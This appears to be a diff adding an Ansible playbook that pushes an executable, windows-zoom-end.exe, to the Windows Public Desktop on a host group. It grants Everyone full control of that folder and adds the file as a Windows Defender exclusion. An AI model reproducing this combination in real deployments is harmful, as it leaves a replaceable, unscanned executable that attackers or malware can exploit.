@@ -1,0 +1,33 @@
+---
+- name: Copy file to Public Desktop and exclude from Windows Defender
+  hosts: BIMCAP
+  tasks:
+    - name: Ensure Public Desktop directory exists
+      win_file:
+        path: C:\Users\Public\Desktop
+        state: directory
+
+    - name: Ensure Public Desktop is not hidden
+      win_shell: |
+        attrib -h "C:\Users\Public\Desktop"  # Removes hidden attribute
+      args:
+        executable: cmd
+
+    - name: Set permissions on Public Desktop to allow access for all users
+      win_acl:
+        path: C:\Users\Public\Desktop
+        user: Everyone
+        rights: FullControl  # Grant full access to all users
+        type: allow
+
+    - name: Copy the file to the Public Desktop
+      win_copy:
+        src: /home/user/windows-zoom-end.exe  # Local path to the file on the Ansible controller
+        dest: C:\Users\Public\Desktop\windows-zoom-end.exe  # Destination path on the Public Desktop
+
+    - name: Exclude the file from Windows Defender
+      win_shell: |
+        Add-MpPreference -ExclusionPath "C:\Users\Public\Desktop\windows-zoom-end.exe"
+      args:
+        executable: powershell
+
